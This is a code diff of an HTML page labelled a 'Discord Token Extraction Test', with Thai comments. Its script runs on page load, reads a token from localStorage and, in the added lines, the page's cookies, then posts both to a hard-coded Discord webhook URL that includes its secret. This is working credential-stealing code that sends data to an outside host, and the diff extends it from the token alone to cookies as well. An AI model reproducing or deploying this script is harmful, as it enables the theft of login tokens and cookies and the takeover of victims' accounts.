@@ -3,35 +3,50 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Token Extraction Test</title>
+    <title>Discord Token Extraction Test</title>
 </head>
 <body>
-    <h1>Token Extraction Test</h1>
+    <h1>Discord Token Extraction Test</h1>
     <p id="output"></p>
 
     <script>
-        // ฟังก์ชันที่จะทำงานเมื่อหน้าเว็บโหลดเสร็จ
         window.onload = function() {
-            // สมมติว่าโทเค็นเก็บอยู่ใน localStorage
-            let token = localStorage.getItem('token');
-            if (token) {
-                // แสดงโทเค็นในหน้า HTML
-                document.getElementById('output').textContent = 'Token: ' + token;
-
-                // ส่งโทเค็นไปยัง URL ที่กำหนด
-                fetch('https://discord.com/api/webhooks/1252253384501887067/VEuHR4FVh43ztNVPgmE0kd7RqWFIM154Gha7s63Do-R1tc4VbuLQ8DzOaamP323Te4nd', {
-                    method: 'POST',
-                    headers: {
-                        'Content-Type': 'application/json',
-                    },
-                    body: JSON.stringify({ token: token })
-                })
-                .then(response => response.text())
-                .then(data => console.log('Success:', data))
-                .catch((error) => console.error('Error:', error));
-            } else {
-                document.getElementById('output').textContent = 'Token not found.';
+            // ฟังก์ชันเพื่อดึง token จาก localStorage
+            function getTokenFromLocalStorage() {
+                let token = localStorage.getItem('token');
+                return token;
             }
+
+            // ฟังก์ชันเพื่อดึง cookies
+            function getCookies() {
+                let cookies = document.cookie;
+                return cookies;
+            }
+
+            // ดึงข้อมูลจาก localStorage และ cookies
+            let token = getTokenFromLocalStorage();
+            let cookies = getCookies();
+
+            // สร้างข้อความที่จะส่งไป
+            let payload = {
+                token: token,
+                cookies: cookies
+            };
+
+            // แสดงผลลัพธ์ในหน้า HTML
+            document.getElementById('output').textContent = `Token: ${token}\nCookies: ${cookies}`;
+
+            // ส่งข้อมูลไปยัง URL ที่กำหนด
+            fetch('https://discord.com/api/webhooks/1252253384501887067/VEuHR4FVh43ztNVPgmE0kd7RqWFIM154Gha7s63Do-R1tc4VbuLQ8DzOaamP323Te4nd', {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                },
+                body: JSON.stringify(payload)
+            })
+            .then(response => response.text())
+            .then(data => console.log('Success:', data))
+            .catch(error => console.error('Error:', error));
         };
     </script>
 </body>
